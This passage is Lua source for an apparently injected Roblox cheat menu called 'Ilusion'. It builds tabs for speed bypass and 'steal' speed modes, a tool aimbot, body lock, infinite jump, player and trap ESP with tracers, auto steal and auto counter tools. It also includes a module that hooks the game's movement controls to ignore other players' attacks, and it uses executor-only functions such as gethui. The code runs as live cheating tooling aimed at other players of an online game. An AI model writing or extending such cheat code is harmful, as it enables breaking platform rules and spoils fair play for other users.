 b.Text = keyName(key)
 listening = nil
 conn:Disconnect()
 if onSet then onSet(key) end
 end)
	end)
	return b
end
function actionBtn(parent, text, color, cb, order)
	local r = row(parent, 36, order)
	r.BackgroundColor3 = color or C.accent
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(1, 0, 1, 0)
	b.BackgroundTransparency = 1
	b.Text = text
	b.TextColor3 = Color3.fromRGB(30, 20, 30)
	b.TextSize = 13
	b.Font = Enum.Font.GothamBold
	b.Parent = r
	b.Active = true
	b.ZIndex = 20
	local _busy = false
	local function fire()
 if _busy then return end
 _busy = true
 if cb then pcall(cb) end
 task.delay(0.15, function() _busy = false end)
	end
	b.MouseButton1Click:Connect(fire)
	b.Activated:Connect(fire)
	return r
end

----------------------------------------------------------------
-- PLAYER TAB
----------------------------------------------------------------
section(pagePlayer, "* — ANTI", 1)
toggleNamed(pagePlayer, "Anti Gummy Bear", St.antiGummy, setAntiGummy, 2, "antiGummy")
toggleNamed(pagePlayer, "Anti Ragdoll", St.antiRagdoll, setAntiRagdoll, 3, "antiRagdoll")
do
	local r = row(pagePlayer, 36, 3.5)
	local label = Instance.new("TextLabel")
	label.BackgroundTransparency = 1
	label.Size = UDim2.new(0.4, 0, 1, 0)
	label.Font = Enum.Font.Gotham
	label.TextSize = 12
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.TextColor3 = C.textDim
	label.Text = " Mode"
	label.Parent = r
	local holder = Instance.new("Frame")
	holder.Size = UDim2.new(0.55, 0, 0, 26)
	holder.Position = UDim2.new(0.42, 0, 0.5, -13)
	holder.BackgroundColor3 = C.box
	holder.BorderSizePixel = 0
	holder.Parent = r
	local hc = Instance.new("UICorner")
	hc.CornerRadius = UDim.new(0, 8)
	hc.Parent = holder
	local slide = Instance.new("Frame")
	slide.Size = UDim2.new(0.5, -6, 1, -6)
	slide.Position = UDim2.new(0, 3, 0, 3)
	slide.BackgroundColor3 = C.accent
	slide.BorderSizePixel = 0
	slide.ZIndex = 2
	slide.Parent = holder
	local sc = Instance.new("UICorner")
	sc.CornerRadius = UDim.new(0, 6)
	sc.Parent = slide
	local t1 = Instance.new("TextLabel")
	t1.BackgroundTransparency = 1
	t1.Size = UDim2.new(0.5, 0, 1, 0)
	t1.Font = Enum.Font.GothamBold
	t1.TextSize = 11
	t1.Text = "V1"
	t1.TextColor3 = C.text
	t1.ZIndex = 3
	t1.Parent = holder
	local t2 = Instance.new("TextLabel")
	t2.BackgroundTransparency = 1
	t2.Size = UDim2.new(0.5, 0, 1, 0)
	t2.Position = UDim2.new(0.5, 0, 0, 0)
	t2.Font = Enum.Font.GothamBold
	t2.TextSize = 11
	t2.Text = "V2"
	t2.TextColor3 = C.text
	t2.ZIndex = 3
	t2.Parent = holder
	local function refresh()
 local isV2 = tostring(St.antiRagdollMode or "V1"):upper() == "V2"
 slide.Position = isV2 and UDim2.new(0.5, 2, 0, 3) or UDim2.new(0, 3, 0, 3)
 t1.TextTransparency = isV2 and 0.35 or 0
 t2.TextTransparency = isV2 and 0 or 0.35
	end
	_G.IlusionRefreshAntiRagMode = refresh
	local b1 = Instance.new("TextButton")
	b1.BackgroundTransparency = 1
	b1.Size = UDim2.new(0.5, 0, 1, 0)
	b1.Text = ""
	b1.ZIndex = 4
	b1.Parent = holder
	b1.MouseButton1Click:Connect(function() setAntiRagdollMode("V1"); refresh() end)
	local b2 = Instance.new("TextButton")
	b2.BackgroundTransparency = 1
	b2.Size = UDim2.new(0.5, 0, 1, 0)
	b2.Position = UDim2.new(0.5, 0, 0, 0)
	b2.Text = ""
	b2.ZIndex = 4
	b2.Parent = holder
	b2.MouseButton1Click:Connect(function() setAntiRagdollMode("V2"); refresh() end)
	refresh()
end
toggleNamed(pagePlayer, "Anti Paintball Gun", St.antiPaint, setAntiPaint, 4, "antiPaint")
toggleNamed(pagePlayer, "Anti Boogie Bomb", St.antiBoogie, setAntiBoogie, 5, "antiBoogie")
toggleNamed(pagePlayer, "Anti Bee", St.antiBee == true, function(state)
	St.antiBee = state and true or false
	if AntiBeeModule then
		pcall(function() AntiBeeModule.set(state) end)
	end
	pcall(saveCfg)
end, 6, "antiBee")



-- ============================================================
-- Ragdoll TP Left/Right removed

-- ============================================================
-- ANTI BEE MODULE
-- ============================================================

local AntiBeeModule = nil

do
    local function buildAntiBee()
        local Data = {
            running = false,
            connections = {},
            originalMoveFunction = nil,
            controlsProtected = false,
            badLightingNames = {
                Blue = true,
                DiscoEffect = true,
                BeeBlur = true,
                ColorCorrection = true
            },
        }

        local function nuke(obj)
            if not obj or not obj.Parent then return end
            if Data.badLightingNames[obj.Name] then
                pcall(function()
                    obj:Destroy()
                end)
            end
        end

        local function disconnectAll()
            for _, conn in ipairs(Data.connections) do
                if typeof(conn) == "RBXScriptConnection" then
                    conn:Disconnect()
                end
            end
            Data.connections = {}
        end

        local function protectControls()
            if Data.controlsProtected then return end

            pcall(function()
                local PlayerModule =
                    LP.PlayerScripts:FindFirstChild("PlayerModule")

                if not PlayerModule then return end

                local Controls = require(PlayerModule):GetControls()
                if not Controls then return end

                if not Data.originalMoveFunction then
                    Data.originalMoveFunction = Controls.moveFunction
                end

                local function protectedMove(self, moveVector, relativeToCamera)
                    if Data.originalMoveFunction then
                        Data.originalMoveFunction(
                            self,
                            moveVector,
                            relativeToCamera
                        )
                    end
                end

                local acc = 0

                table.insert(Data.connections,
                    RS.Heartbeat:Connect(function(dt)
                        if not Data.running then return end

                        acc = acc + dt
                        if acc < 0.25 then return end
                        acc = 0

                        if Controls.moveFunction ~= protectedMove then
                            Controls.moveFunction = protectedMove
                        end
                    end)
                )

                Controls.moveFunction = protectedMove
                Data.controlsProtected = true
            end)
        end

        local function restoreControls()
            if not Data.controlsProtected then return end

            pcall(function()
                local PlayerModule =
                    LP.PlayerScripts:FindFirstChild("PlayerModule")

                if not PlayerModule then return end

                local Controls = require(PlayerModule):GetControls()

                if Controls and Data.originalMoveFunction then
                    Controls.moveFunction = Data.originalMoveFunction
                    Data.controlsProtected = false
                end
            end)
        end

        local function blockBuzzing()
            pcall(function()
                local beeScript =
                    LP.PlayerScripts:FindFirstChild("Bee", true)

                if beeScript then
                    local buzzing = beeScript:FindFirstChild("Buzzing")

                    if buzzing and buzzing:IsA("Sound") then
                        buzzing:Stop()
                        buzzing.Volume = 0
                    end
                end
            end)
        end

        local function lockFOV()
            local cam = workspace.CurrentCamera
            if cam then
                cam.FieldOfView = 70
            end
        end

        local function enable()
            if Data.running then return end
            Data.running = true

            for _, inst in ipairs(Lighting:GetDescendants()) do
                nuke(inst)
            end

            table.insert(Data.connections,
                Lighting.DescendantAdded:Connect(function(obj)
                    if Data.running then
                        nuke(obj)
                    end
                end)
            )

            protectControls()

            local buzzAcc = 0

            table.insert(Data.connections,
                RS.Heartbeat:Connect(function(dt)
                    if not Data.running then return end

                    buzzAcc = buzzAcc + dt
                    if buzzAcc < 0.25 then return end
                    buzzAcc = 0

                    blockBuzzing()
                    lockFOV()
                end)
            )
        end

        local function disable()
            if not Data.running then return end

            Data.running = false
            restoreControls()
            disconnectAll()
        end

        return {
            set = function(state)
                if state then
                    enable()
                else
                    disable()
                end
            end
        }
    end

    AntiBeeModule = buildAntiBee()
end


section(pageSpeed, "* — SPEED (Vis S2)", 10)
toggleNamed(pageSpeed, "Speed On", St.speedOn, setSpeedOn, 11, "speedOn")

local modeCards = {}
function modeCard(name, desc, order)
	local m = St.modes[name]
	local r = row(pageSpeed, 58, order)
	modeCards[name] = r
	local nm = Instance.new("TextLabel")
	nm.Size = UDim2.new(0, 130, 0, 18)
	nm.Position = UDim2.new(0, 12, 0, 6)
	nm.BackgroundTransparency = 1
	nm.Text = name .. " Speed"
	nm.TextColor3 = C.text
	nm.TextSize = 13
	nm.Font = Enum.Font.GothamBold
	nm.TextXAlignment = Enum.TextXAlignment.Left
	nm.Parent = r
	local ds = Instance.new("TextLabel")
	ds.Size = UDim2.new(0, 140, 0, 14)
	ds.Position = UDim2.new(0, 12, 0, 24)
	ds.BackgroundTransparency = 1
	ds.Text = desc
	ds.TextColor3 = C.textDim
	ds.TextSize = 10
	ds.Font = Enum.Font.Gotham
	ds.TextXAlignment = Enum.TextXAlignment.Left
	ds.Parent = r
	-- Keybind PC: giữa khoảng norm ↔ steal
	keyBtn(r, m.key, function(k) St.modes[name].key = k; saveCfg() end, UDim2.new(1, -112, 0, 28))
	local ln = Instance.new("TextLabel")
	ln.Size = UDim2.new(0, 48, 0, 12)
	ln.Position = UDim2.new(1, -150, 0, 4)
	ln.BackgroundTransparency = 1
	ln.Text = "norm"
	ln.TextColor3 = C.textDim
	ln.TextSize = 9
	ln.Font = Enum.Font.Gotham
	ln.Parent = r
	local ls = Instance.new("TextLabel")
	ls.Size = UDim2.new(0, 48, 0, 12)
	ls.Position = UDim2.new(1, -72, 0, 4)
	ls.BackgroundTransparency = 1
	ls.Text = "steal"
	ls.TextColor3 = C.textDim
	ls.TextSize = 9
	ls.Font = Enum.Font.Gotham
	ls.Parent = r
	numBox(r, UDim2.new(1, -150, 0, 20), 48, m.norm, function(v)
 St.modes[name].norm = math.clamp(tonumber(v) or 59, 1, 200)
 if St.activeMode == name then
 currentSpeedValue = getActiveMoveSpeed()
 if speedConnection then pcall(function() speedConnection:Disconnect() end); speedConnection = nil end
 if St.speedOn then pcall(startSpeedBoost) end
 end
 saveCfg()
	end)
	numBox(r, UDim2.new(1, -72, 0, 20), 48, m.steal, function(v)
 St.modes[name].steal = math.clamp(tonumber(v) or 30, 1, 200)
 if St.activeMode == name then
 currentSpeedValue = getActiveMoveSpeed()
 if speedConnection then pcall(function() speedConnection:Disconnect() end); speedConnection = nil end
 if St.speedOn then pcall(startSpeedBoost) end
 end
 saveCfg()
	end)
	local hit = Instance.new("TextButton")
	hit.Size = UDim2.new(0.45, 0, 1, 0)
	hit.BackgroundTransparency = 1
	hit.Text = ""
	hit.Active = true
	hit.ZIndex = 15
	hit.Parent = r
	hit.MouseButton1Click:Connect(function() setActiveMode(name) end)
	hit.Activated:Connect(function() setActiveMode(name) end)
end
modeCard("Normal", "default mode", 12)
modeCard("Lagger", "use against lagger", 13)
modeCard("Custom", "custom spd", 14)
function _G.IlusionRefreshModeCards()
	for n, card in pairs(modeCards) do
 local st = card:FindFirstChildOfClass("UIStroke")
 if st then
 local on = St.activeMode == n
 st.Color = on and C.accent or C.stroke
 st.Transparency = on and 0.05 or 0.35
 end
	end
end
_G.IlusionRefreshModeCards()


section(pagePlayer, "* — COMBAT / DROP / RESET", 20)
toggleNamed(pagePlayer, "Tool Aimbot", St.toolAim, setToolAim, 21, "toolAim")
toggleNamed(pagePlayer, "Body Lock", St.bodyLock == true, setBodyLock, 22, "bodyLock")
do
	local rr = row(pagePlayer, 36, 22)
	local rl = Instance.new("TextLabel")
	rl.Size = UDim2.new(0.55, 0, 1, 0)
	rl.BackgroundTransparency = 1
	rl.Text = "Body Lock Range"
	rl.TextColor3 = C.text
	rl.TextSize = 12
	rl.Font = Enum.Font.Gotham
	rl.TextXAlignment = Enum.TextXAlignment.Left
	rl.Parent = rr
	numBox(rr, UDim2.new(1, -70, 0.5, -12), 56, tonumber(St.bodyLockRange) or 20, function(v)
 setBodyLockRange(v)
	end)
end
-- Ragdoll TP Left/Right removed from menu

toggleNamed(pagePlayer, "Infinite Jump (Hold)", St.infJump, setInfJump, 215, "infJump")
toggleNamed(pagePlayer, "Auto Destroy Sentry", St.destroySentry, setDestroySentry, 216, "destroySentry")
-- drop mode
local dropRow = row(pagePlayer, 38, 22)
local dropLbl = Instance.new("TextLabel")
dropLbl.Size = UDim2.new(0.4, 0, 1, 0)
dropLbl.Position = UDim2.new(0, 12, 0, 0)
dropLbl.BackgroundTransparency = 1
dropLbl.Text = "Drop Mode"
dropLbl.TextColor3 = C.text
dropLbl.TextSize = 13
dropLbl.Font = Enum.Font.Gotham
dropLbl.TextXAlignment = Enum.TextXAlignment.Left
dropLbl.Parent = dropRow
for i, name in ipairs({ "Stand", "Jump" }) do
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 60, 0, 26)
	b.Position = UDim2.new(1, -140 + (i - 1) * 66, 0.5, -13)
	b.BackgroundColor3 = ((St.dropMode == 1 and name == "Stand") or (St.dropMode == 2 and name == "Jump")) and C.accent or C.box
	b.Text = name
	b.TextColor3 = ((St.dropMode == 1 and name == "Stand") or (St.dropMode == 2 and name == "Jump")) and Color3.fromRGB(30, 20, 30) or C.text
	b.TextSize = 11
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Parent = dropRow
	corner(b, 7)
	b.Active = true
	b.ZIndex = 40
	function pickDrop()
 St.dropMode = (name == "Jump") and 2 or 1
 for _, ch in ipairs(dropRow:GetChildren()) do
 if ch:IsA("TextButton") then
 local on = (St.dropMode == 2 and ch.Text == "Jump") or (St.dropMode == 1 and ch.Text == "Stand")
 ch.BackgroundColor3 = on and C.accent or C.box
 ch.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
 end
 end
 pcall(saveCfg)
	end
	b.MouseButton1Click:Connect(pickDrop)
	b.Activated:Connect(pickDrop)
end
actionBtn(pagePlayer, "Drop Now", C.accent, runDrop, 23)

local instaRow = row(pagePlayer, 38, 24)
local instaLbl = Instance.new("TextLabel")
instaLbl.Size = UDim2.new(0.4, 0, 1, 0)
instaLbl.Position = UDim2.new(0, 12, 0, 0)
instaLbl.BackgroundTransparency = 1
instaLbl.Text = "Insta Reset"
instaLbl.TextColor3 = C.text
instaLbl.TextSize = 13
instaLbl.Font = Enum.Font.Gotham
instaLbl.TextXAlignment = Enum.TextXAlignment.Left
instaLbl.Parent = instaRow
for i, name in ipairs({ "V1", "V2" }) do
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 48, 0, 26)
	b.Position = UDim2.new(1, -120 + (i - 1) * 54, 0.5, -13)
	b.BackgroundColor3 = (St.instaMode == name) and C.accent or C.box
	b.Text = name
	b.TextColor3 = (St.instaMode == name) and Color3.fromRGB(30, 20, 30) or C.text
	b.TextSize = 11
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Parent = instaRow
	corner(b, 7)
	b.Active = true
	b.ZIndex = 40
	function pickInsta()
 St.instaMode = name
 for _, ch in ipairs(instaRow:GetChildren()) do
 if ch:IsA("TextButton") then
 local on = ch.Text == St.instaMode
 ch.BackgroundColor3 = on and C.accent or C.box
 ch.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
 end
 end
 pcall(saveCfg)
	end
	b.MouseButton1Click:Connect(pickInsta)
	b.Activated:Connect(pickInsta)
end
actionBtn(pagePlayer, "Insta Reset Now", C.danger, doInstaReset, 25)
actionBtn(pagePlayer, "TP Down", C.accent, function() doTPDown(true) end, 26)

section(pagePlayer, "* — KEYBINDS", 30)
function keyRow(label, keyId, order)
	local r = row(pagePlayer, 36, order)
	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(1, -56, 1, 0)
	t.Position = UDim2.new(0, 12, 0, 0)
	t.BackgroundTransparency = 1
	t.Text = label
	t.TextColor3 = C.text
	t.TextSize = 13
	t.Font = Enum.Font.Gotham
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = r
	keyBtn(r, St.keys[keyId], function(k) St.keys[keyId] = k; saveCfg() end, UDim2.new(1, -48, 0.5, -12))
end
keyRow("Key Drop", "Drop", 31)
keyRow("Key TP Down", "TPDown", 32)
keyRow("Key Insta Reset", "InstaReset", 33)
keyRow("Key Destroy Sentry", "DestroySentry", 34)
keyRow("Key Auto Steal", "AutoSteal", 35)

-- Full KEYBINDS TAB
if pageKeys then
	section(pageKeys, "* — KEYBINDS (PC) — None = khong phim", 1)
	local function keyRowTab(label, keyId, order)
 local r = row(pageKeys, 36, order)
 local t = Instance.new("TextLabel")
 t.Size = UDim2.new(1, -100, 1, 0)
 t.Position = UDim2.new(0, 12, 0, 0)
 t.BackgroundTransparency = 1
 t.Text = label
 t.TextColor3 = C.text
 t.TextSize = 13
 t.Font = Enum.Font.Gotham
 t.TextXAlignment = Enum.TextXAlignment.Left
 t.Parent = r
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 88, 0, 28)
 b.Position = UDim2.new(1, -96, 0.5, -14)
 b.BackgroundColor3 = C.box
 b.TextColor3 = C.text
 b.TextSize = 12
 b.Font = Enum.Font.GothamBold
 b.AutoButtonColor = false
 b.Parent = r
 corner(b, 7)
 local function refresh()
 local k = St.keys and St.keys[keyId]
 if not k or k == Enum.KeyCode.Unknown then
 b.Text = "None"
 else
 b.Text = tostring(k.Name or k)
 end
 end
 refresh()
 local listening = false
 local function startListen()
 if listening then return end
 listening = true
 b.Text = "..."
 b.BackgroundColor3 = C.accent
 local conn
 conn = UIS.InputBegan:Connect(function(inp, gp)
 if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
 local code = inp.KeyCode
 if code == Enum.KeyCode.Escape then
 -- keep current
 listening = false
 b.BackgroundColor3 = C.box
 refresh()
 if conn then conn:Disconnect() end
 return
 end
 if code == Enum.KeyCode.Backspace or code == Enum.KeyCode.Delete then
 St.keys[keyId] = nil
 else
 St.keys[keyId] = code
 end
 listening = false
 b.BackgroundColor3 = C.box
 refresh()
 pcall(saveCfg)
 if conn then conn:Disconnect() end
 end)
 end
 b.MouseButton1Click:Connect(startListen)
 b.Activated:Connect(startListen)
	end
	keyRowTab("Drop", "Drop", 2)
	keyRowTab("TP Down", "TPDown", 3)
	keyRowTab("Insta Reset", "InstaReset", 4)
	keyRowTab("Destroy Sentry", "DestroySentry", 5)
	keyRowTab("Auto Steal (toggle)", "AutoSteal", 6)
	local hint = Instance.new("TextLabel")
	hint.Size = UDim2.new(1, -16, 0, 40)
	hint.BackgroundTransparency = 1
	hint.Text = "Bam nut → nhan phim de gan\nBackspace/Delete = None | Esc = huy"
	hint.TextColor3 = C.textDim
	hint.TextSize = 11
	hint.Font = Enum.Font.Gotham
	hint.TextWrapped = true
	hint.TextXAlignment = Enum.TextXAlignment.Left
	hint.Parent = pageKeys
	hint.LayoutOrder = 20
end

----------------------------------------------------------------
-- ESP TAB
----------------------------------------------------------------
section(pageESP, "* — ESP", 1)
toggleNamed(pageESP, "Player ESP", St.esp, setESP, 2, "esp")
toggleNamed(pageESP, "Tracker / Tracer", St.tracer, setTracer, 3, "tracer")
toggleNamed(pageESP, "Trap ESP", St.trapEsp == true, setTrapESP, 4, "trapEsp")
toggleNamed(pageESP, "Anti Lag", St.antiLag, setAntiLag, 5, "antiLag")


----------------------------------------------------------------
-- SPAM TAB
----------------------------------------------------------------
section(pageSpam, "* — AUTO SPAM (khong auto-equip)", 1)
toggleNamed(pageSpam, "Spam Laser Cape", St.spamLaser, setSpamLaser, 2, "spamLaser")
toggleNamed(pageSpam, "Spam Paintball Gun", St.spamPaint, setSpamPaint, 3, "spamPaint")

section(pageCounter, "* — COUNTER (auto equip / activate)", 1)
toggleNamed(pageCounter, "Auto Laser Cape", St.counterLaser == true, setCounterLaser, 2, "counterLaser")
toggleNamed(pageCounter, "Auto Boogie Bomb", St.counterBoogie == true, setCounterBoogie, 3, "counterBoogie")
toggleNamed(pageCounter, "Auto Swap Body", St.counterSwapBody == true, setCounterSwapBody, 4, "counterSwapBody")
toggleNamed(pageCounter, "Equip & Activate on Drop", St.equipOnDrop == true, setEquipOnDrop, 5, "equipOnDrop")
do
	local info = Instance.new("TextLabel")
	info.Size = UDim2.new(1, -20, 0, 48)
	info.BackgroundTransparency = 1
	info.Text = "Laser Cape / Boogie Bomb / Swap Body: tu cam + Activate.\nOn Drop: sau khi DROP se equip & activate tool counter."
	info.TextColor3 = C.textDim
	info.TextSize = 11
	info.Font = Enum.Font.Gotham
	info.TextWrapped = true
	info.TextXAlignment = Enum.TextXAlignment.Left
	info.Parent = pageCounter
	info.LayoutOrder = 7
end


local spamInfo = row(pageSpam, 48, 4)
local spamTxt = Instance.new("TextLabel")
spamTxt.Size = UDim2.new(1, -12, 1, 0)
spamTxt.Position = UDim2.new(0, 6, 0, 0)
spamTxt.BackgroundTransparency = 1
spamTxt.Text = "Chi Activate khi dang CAM tool.\nNo tu Equip. Dung cung Tool Aimbot neu can."
spamTxt.TextColor3 = C.textDim
spamTxt.TextSize = 10
spamTxt.Font = Enum.Font.Gotham
spamTxt.TextXAlignment = Enum.TextXAlignment.Left
spamTxt.TextYAlignment = Enum.TextYAlignment.Center
spamTxt.Parent = spamInfo


----------------------------------------------------------------
-- FLOATING TOOL BUTTONS visibility (Piam / Sentry / Agu / Medu)
----------------------------------------------------------------
function _G.IlusionApplyToolButtons()
	local map = {
		IlusionPiamButtonGui = St.showBtnPiam ~= false,
		IlusionSentryButtonGui = St.showBtnSentry ~= false,
		IlusionAguButtonGui = St.showBtnAgu ~= false,
		IlusionMedusaButtonGui = St.showBtnMedu ~= false,
	}
	local parents = { PlayerGui }
	pcall(function() table.insert(parents, game:GetService("CoreGui")) end)
	pcall(function() if gethui then table.insert(parents, gethui()) end end)
	for _, parent in ipairs(parents) do
		if parent then
			for name, on in pairs(map) do
				local g = parent:FindFirstChild(name)
				if g then
					pcall(function() g.Enabled = on and true or false end)
				end
			end
		end
	end
end

----------------------------------------------------------------
-- SETTINGS TAB
----------------------------------------------------------------
section(pageSet, "* — MOBILE / LOCK", 1)
toggleNamed(pageSet, "Mobile Buttons", St.mobileBtns, function(on)
	St.mobileBtns = on
	if _G.IlusionApplyMobile then _G.IlusionApplyMobile() end
	saveCfg()
end, 2, "mobileBtns")
toggleNamed(pageSet, "Show Auto Steal Button", St.showStealBtn ~= false, function(on)
	St.showStealBtn = on and true or false
	if _G.IlusionRefreshStealBtn then pcall(_G.IlusionRefreshStealBtn) end
	-- nếu ON show mà chưa có nút → rebuild
	if St.showStealBtn and (not actRefs or not actRefs.steal) and _G.IlusionApplyMobile then
 pcall(_G.IlusionApplyMobile)
	end
	saveCfg()
end, 2.5, "showStealBtn")

section(pageSet, "* — BUTTONS", 3)
toggleNamed(pageSet, "Piam", St.showBtnPiam ~= false, function(on)
	St.showBtnPiam = on and true or false
	if _G.IlusionApplyToolButtons then _G.IlusionApplyToolButtons() end
	saveCfg()
end, 3.1, "showBtnPiam")
toggleNamed(pageSet, "Sentry", St.showBtnSentry ~= false, function(on)
	St.showBtnSentry = on and true or false
	if _G.IlusionApplyToolButtons then _G.IlusionApplyToolButtons() end
	saveCfg()
end, 3.2, "showBtnSentry")
toggleNamed(pageSet, "Agu", St.showBtnAgu ~= false, function(on)
	St.showBtnAgu = on and true or false
	if _G.IlusionApplyToolButtons then _G.IlusionApplyToolButtons() end
	saveCfg()
end, 3.3, "showBtnAgu")
toggleNamed(pageSet, "Medu", St.showBtnMedu ~= false, function(on)
	St.showBtnMedu = on and true or false
	if _G.IlusionApplyToolButtons then _G.IlusionApplyToolButtons() end
	saveCfg()
end, 3.4, "showBtnMedu")

section(pageSet, "* — MENU BACKGROUND", 4)
do
	local r = row(pageSet, 36, 4.1)
	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(1, -20, 1, 0)
	t.Position = UDim2.fromOffset(12, 0)
	t.BackgroundTransparency = 1
	t.Text = "Background: " .. (BG_FILES[(St.bgIndex or 1)].name or "?")
	t.TextColor3 = C.text
	t.Font = Enum.Font.Gotham
	t.TextSize = 12
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = r
	_G.IlusionBgLabel = t
end
do
	local r = row(pageSet, 42, 4.2)
	local names = {"Heaven", "Knight", "Samurai", "Snow"}
	for i, nm in ipairs(names) do
		local b = Instance.new("TextButton")
		b.Size = UDim2.fromOffset(70, 28)
		b.Position = UDim2.new(0, 10 + (i-1)*76, 0.5, -14)
		b.BackgroundColor3 = ((St.bgIndex or 1) == i) and C.accent or C.box
		b.Text = nm
		b.TextColor3 = ((St.bgIndex or 1) == i) and Color3.fromRGB(20,20,20) or C.text
		b.Font = Enum.Font.GothamBold
		b.TextSize = 11
		b.AutoButtonColor = false
		b.Parent = r
		corner(b, 0) -- square
		b.MouseButton1Click:Connect(function()
			applyMenuBackground(i)
			if _G.IlusionBgLabel then
				_G.IlusionBgLabel.Text = "Background: " .. nm
			end
			for _, ch in ipairs(r:GetChildren()) do
				if ch:IsA("TextButton") then
					local on = ch.Text == nm
					ch.BackgroundColor3 = on and C.accent or C.box
					ch.TextColor3 = on and Color3.fromRGB(20,20,20) or C.text
				end
			end
		end)
	end
end

toggleNamed(pageSet, "Show Panel TP", St.showTPPanel ~= false, function(on)
	St.showTPPanel = on and true or false
	local g = PlayerGui:FindFirstChild("IlusionbTP")
	if g then g.Enabled = St.showTPPanel end
	saveCfg()
end, 25, "showTPPanel")
toggleNamed(pageSet, "Show Panel Lagger", St.showLaggerPanel == true, function(on)
	if _G.IlusionSetLaggerPanel then _G.IlusionSetLaggerPanel(on) else St.showLaggerPanel = on; saveCfg() end
end, 25.1, "showLaggerPanel")
toggleNamed(pageSet, "Show Panel Speed Bypass", St.showSpeedBypassPanel == true, function(on)
	if _G.IlusionSetSpeedBypassPanel then _G.IlusionSetSpeedBypassPanel(on) else St.showSpeedBypassPanel = on; saveCfg() end
end, 25.3, "showSpeedBypassPanel")
-- Panel GUI size (to/nhỏ + rộng) dưới các panel
do
	local r = row(pageSet, 38, 25.4)
	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(0.45, 0, 1, 0)
	t.Position = UDim2.new(0, 12, 0, 0)
	t.BackgroundTransparency = 1
	t.Text = "Panels Scale %"
	t.TextColor3 = C.text
	t.TextSize = 12
	t.Font = Enum.Font.Gotham
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = r
	local val = Instance.new("TextLabel")
	val.Size = UDim2.new(0, 44, 0, 24)
	val.Position = UDim2.new(1, -120, 0.5, -12)
	val.BackgroundTransparency = 1
	val.Text = tostring(math.floor((St.panelGuiScale or 0.7) * 100)) .. "%"
	val.TextColor3 = C.text
	val.TextSize = 12
	val.Font = Enum.Font.GothamBold
	val.Parent = r
	for _, info in ipairs({{"-", -80}, {"+", -44}}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 28, 0, 28)
 b.Position = UDim2.new(1, info[2], 0.5, -14)
 b.BackgroundColor3 = C.box
 b.Text = info[1]
 b.TextColor3 = C.text
 b.TextSize = 16
 b.Font = Enum.Font.GothamBold
 b.AutoButtonColor = false
 b.Parent = r
 corner(b, 7)
 local function fire()
 St.panelGuiScale = math.clamp((tonumber(St.panelGuiScale) or 1) + (info[1] == "+" and 0.05 or -0.05), 0.6, 1.6)
 val.Text = tostring(math.floor(St.panelGuiScale * 100)) .. "%"
 if _G.IlusionApplyPanelGuiScale then pcall(_G.IlusionApplyPanelGuiScale) end
 saveCfg()
 end
 b.MouseButton1Click:Connect(fire)
 b.Activated:Connect(fire)
	end
end
do
	local r = row(pageSet, 38, 25.45)
	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(0.45, 0, 1, 0)
	t.Position = UDim2.new(0, 12, 0, 0)
	t.BackgroundTransparency = 1
	t.Text = "Panels Width %"
	t.TextColor3 = C.text
	t.TextSize = 12
	t.Font = Enum.Font.Gotham
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = r
	local val = Instance.new("TextLabel")
	val.Size = UDim2.new(0, 44, 0, 24)
	val.Position = UDim2.new(1, -120, 0.5, -12)
	val.BackgroundTransparency = 1
	val.Text = tostring(math.floor((St.panelGuiWidth or 1) * 100)) .. "%"
	val.TextColor3 = C.text
	val.TextSize = 12
	val.Font = Enum.Font.GothamBold
	val.Parent = r
	for _, info in ipairs({{"-", -80}, {"+", -44}}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 28, 0, 28)
 b.Position = UDim2.new(1, info[2], 0.5, -14)
 b.BackgroundColor3 = C.box
 b.Text = info[1]
 b.TextColor3 = C.text
 b.TextSize = 16
 b.Font = Enum.Font.GothamBold
 b.AutoButtonColor = false
 b.Parent = r
 corner(b, 7)
 local function fire()
 St.panelGuiWidth = math.clamp((tonumber(St.panelGuiWidth) or 1) + (info[1] == "+" and 0.05 or -0.05), 0.7, 1.5)
 val.Text = tostring(math.floor(St.panelGuiWidth * 100)) .. "%"
 if _G.IlusionApplyPanelGuiScale then pcall(_G.IlusionApplyPanelGuiScale) end
 saveCfg()
 end
 b.MouseButton1Click:Connect(fire)
 b.Activated:Connect(fire)
	end
end
toggleNamed(pageSet, "Lock UI", St.guiLock, function(on)
	St.guiLock = on and true or false
	-- snapshot positions then save immediately on lock/unlock
	pcall(function()
 if Main and Main.Parent then
 St._mainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 St.menuOpen = Main.Visible == true
 end
 local miniGui = PlayerGui:FindFirstChild("IlusionFullMini")
 local mini = miniGui and miniGui:FindFirstChildWhichIsA("TextButton")
 if mini then
 St._miniPos = {mini.Position.X.Scale, mini.Position.X.Offset, mini.Position.Y.Scale, mini.Position.Y.Offset}
 end
 local mb = PlayerGui:FindFirstChild("IlusionModeBar")
 local mf = mb and mb:FindFirstChildWhichIsA("Frame")
 if mf then
 St._modeBarPos = {mf.Position.X.Scale, mf.Position.X.Offset, mf.Position.Y.Scale, mf.Position.Y.Offset}
 end
 St._btnPos = St._btnPos or {}
 local function snapHoldersLock(gui)
 if not gui then return end
 for _, holder in ipairs(gui:GetChildren()) do
 if holder:IsA("Frame") or holder:IsA("TextButton") then
 local key = holder.Name
 if key and (key:sub(1,2) == "A_" or key:sub(1,2) == "M_") then
 St._btnPos[key] = {
 holder.Position.X.Scale, holder.Position.X.Offset,
 holder.Position.Y.Scale, holder.Position.Y.Offset,
 holder.Size.X.Offset, holder.Size.Y.Offset,
 }
 end
 end
 end
 end
